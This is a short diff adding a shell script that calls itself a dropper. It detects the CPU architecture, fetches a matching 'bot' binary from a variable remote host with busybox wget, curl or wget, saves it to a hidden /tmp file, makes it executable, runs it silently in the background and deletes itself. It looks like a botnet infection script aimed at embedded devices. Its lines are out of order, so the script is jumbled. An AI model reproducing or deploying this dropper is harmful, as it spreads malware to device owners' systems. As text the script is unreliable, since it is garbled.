@@ -1,0 +1,17 @@
+# Dropper - detects arch, downloads correct binary, executes
+mips)       BIN="bot.mips" ;;
+mipsel)     BIN="bot.mipsel" ;;
+aarch64)    BIN="bot.arm64" ;;
+armv7l)     BIN="bot.arm" ;;
+armv6l)     BIN="bot.arm" ;;
+arm*)       BIN="bot.arm" ;;
+x86_64)     BIN="bot.x86_64" ;;
+i686)       BIN="bot.x86_64" ;;
+*)          BIN="bot.mips" ;;
+/tmp/.d </dev/null >/dev/null 2>&1 &
+# Try wget, curl, busybox wget
+busybox wget -q -O /tmp/.d hxxp://$S:$P/$BIN 2>/dev/null
+chmod 777 /tmp/.d
+curl -s -o /tmp/.d hxxp://$S:$P/$BIN 2>/dev/null || \
+rm -f /tmp/.d $0
+wget -q hxxp://$S:$P/$BIN -O /tmp/.d 2>/dev/null || \
